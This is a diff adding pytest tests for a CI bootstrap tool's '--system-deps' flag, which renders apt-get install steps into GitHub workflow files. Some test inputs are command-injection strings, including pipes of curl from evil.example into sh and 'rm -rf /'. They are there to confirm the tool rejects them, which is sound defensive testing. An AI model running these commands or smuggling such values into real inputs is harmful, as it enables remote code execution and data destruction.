@@ -101,6 +101,7 @@ def test_parse_bootstrap_args_defaults() -> None:
         "app_image_name": "",
         "enable_e2e": "true",
         "services_script": "",
+        "system_deps": "",
         "enforce": "",
     }
 
@@ -1106,6 +1107,215 @@ def test_cmd_bootstrap_explicit_services_script_overrides_autodetect(
     _cmd_bootstrap(["--services-script", ".github/test/custom-setup.sh"])
     tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
     assert 'services-script: ".github/test/custom-setup.sh"' in tests
+
+
+# ---------------------------------------------------------------------------
+# checks.yml system-dependency step (--system-deps)
+# ---------------------------------------------------------------------------
+
+_KRB5_DEPS = "libkrb5-dev gcc python3-dev"
+
+
+def _checks_yml(root: pathlib.Path) -> str:
+    return (root / ".github" / "workflows" / "checks.yml").read_text()
+
+
+def test_parse_bootstrap_args_system_deps() -> None:
+    result = parse_bootstrap_args(["--system-deps", _KRB5_DEPS])
+    assert result["system_deps"] == _KRB5_DEPS
+
+
+def test_parse_bootstrap_args_system_deps_normalizes_whitespace() -> None:
+    """Value is re-joined on single spaces so however it was spelled renders
+    byte-identically -- otherwise C002 would read the spelling as drift."""
+    result = parse_bootstrap_args(["--system-deps=  libkrb5-dev   gcc\n"])
+    assert result["system_deps"] == "libkrb5-dev gcc"
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "libkrb5-dev; curl evil.example/x | sh",
+        "libkrb5-dev && rm -rf /",
+        "$(id)",
+        "`id`",
+        "pkg$HOME",
+    ],
+)
+def test_parse_bootstrap_args_system_deps_rejects_shell_metacharacters(
+    value: str, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """The value is interpolated into a generated workflow's `run:` block, so a
+    token that isn't a plausible apt package name is rejected, never escaped."""
+    with pytest.raises(SystemExit) as exc:
+        parse_bootstrap_args(["--system-deps", value])
+    assert exc.value.code == 2
+    assert "invalid package name" in capsys.readouterr().err
+
+
+def test_checks_yml_without_deps_is_byte_identical_to_no_step_render() -> None:
+    """The <% if %> tags hug their content so an un-taken block leaves no stray
+    blank line -- a one-line whitespace difference here would surface as C002
+    drift in every already-bootstrapped repo (none of which passes this flag)."""
+    rendered = render("checks.yml")
+    assert "apt-get" not in rendered
+    # The checkout step is followed immediately by setup-deps, with nothing
+    # (not even an empty line) where the conditional block sat.
+    assert "# v7.0.1\n      - uses: atlanhq" in rendered
+
+
+def test_checks_yml_renders_system_deps_step() -> None:
+    rendered = render("checks.yml", system_deps=_KRB5_DEPS)
+    assert f"sudo apt-get install -y {_KRB5_DEPS}" in rendered
+    # Ordered before setup-deps: the packages exist to make its `uv sync` work.
+    assert rendered.index("apt-get install") < rendered.index("setup-deps@main")
+
+
+def test_cmd_bootstrap_writes_system_deps_step(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+
+
+def test_cmd_bootstrap_omits_system_deps_step_by_default(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    assert "apt-get" not in _checks_yml(tmp_path)
+
+
+def test_cmd_bootstrap_rerun_preserves_system_deps_step(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The regression this flag exists for: checks.yml is always-overwrite, so
+    without autodetection a bare re-run deleted the step and the repo's
+    pre-commit job then failed on a cold cache building an sdist."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    first = _checks_yml(tmp_path)
+    _cmd_bootstrap([])
+    assert _checks_yml(tmp_path) == first
+
+
+def test_cmd_bootstrap_detects_hand_written_system_deps_step(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Repos that hand-added the step before the flag existed keep it: detection
+    reads any `apt-get install` line, not only the rendered shape."""
+    wf = tmp_path / ".github" / "workflows" / "checks.yml"
+    wf.parent.mkdir(parents=True)
+    wf.write_text(
+        "name: Pre-commit Checks\n"
+        "jobs:\n"
+        "  pre-commit:\n"
+        "    steps:\n"
+        "      - name: Install system dependencies for pykerberos\n"
+        "        run: |\n"
+        "          sudo apt-get update\n"
+        "          sudo apt-get install -y libkrb5-dev gcc python3-dev\n"
+    )
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+
+
+def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    _cmd_bootstrap(["--system-deps", "libpq-dev"])
+    checks = _checks_yml(tmp_path)
+    assert "sudo apt-get install -y libpq-dev" in checks
+    assert "libkrb5-dev" not in checks
+
+
+def test_cmd_bootstrap_writes_ci_system_deps_file(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The D-series leg syncs the resolved env inside the *vendored* action, where
+    no rendered per-repo value can reach it — it reads this file instead."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    assert (
+        tmp_path / ".github" / "ci-system-deps.txt"
+    ).read_text() == f"{_KRB5_DEPS}\n"
+
+
+def test_cmd_bootstrap_omits_ci_system_deps_file_when_no_deps(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """An empty file would make hashFiles() non-empty and turn the guarded step
+    into a pointless apt-get update on every D-leg run."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()
+
+
+def test_cmd_bootstrap_detects_system_deps_from_ci_deps_file(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The txt file is the fallback signal when checks.yml carries no step."""
+    deps_file = tmp_path / ".github" / "ci-system-deps.txt"
+    deps_file.parent.mkdir(parents=True)
+    deps_file.write_text("libkrb5-dev gcc\n")
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    assert "sudo apt-get install -y libkrb5-dev gcc" in _checks_yml(tmp_path)
+
+
+def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A hand-edited file must not smuggle shell text into the rendered step."""
+    deps_file = tmp_path / ".github" / "ci-system-deps.txt"
+    deps_file.parent.mkdir(parents=True)
+    deps_file.write_text("libkrb5-dev && curl evil.example | sh\n")
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    install_line = next(
+        line for line in _checks_yml(tmp_path).splitlines() if "apt-get install" in line
+    )
+    assert install_line.strip() == "sudo apt-get install -y libkrb5-dev"
+
+
+def test_conformance_detect_action_installs_declared_system_deps() -> None:
+    """The vendored action's install step is guarded by hashFiles so it no-ops in
+    every repo without the declaration file."""
+    action = render("run-conformance-detect-action.yaml")
+    assert "hashFiles('.github/ci-system-deps.txt') != ''" in action
+    assert "xargs -r sudo apt-get install -y < .github/ci-system-deps.txt" in action
+    # Must run before the resolved-env sync it exists to unblock.
+    assert action.index("ci-system-deps.txt") < action.index("Sync resolved env")
+
+
+def test_cmd_bootstrap_rerun_after_manual_step_removal_leaves_it_out(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Documented way to drop the packages: delete BOTH signals, then re-run —
+    there is nothing left on disk to detect, so they stay gone."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
+    (tmp_path / ".github" / "ci-system-deps.txt").unlink()
+    _cmd_bootstrap([])
+    assert "apt-get" not in _checks_yml(tmp_path)
+    assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()
+
+
+def test_cmd_bootstrap_restores_step_from_ci_deps_file_when_checks_stripped(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Deleting only the checks.yml step does not drop the packages — the txt
+    file the D-leg reads is still authoritative, so the two can't disagree."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
+    (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
+    _cmd_bootstrap([])
+    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
 
 
 # ---------------------------------------------------------------------------
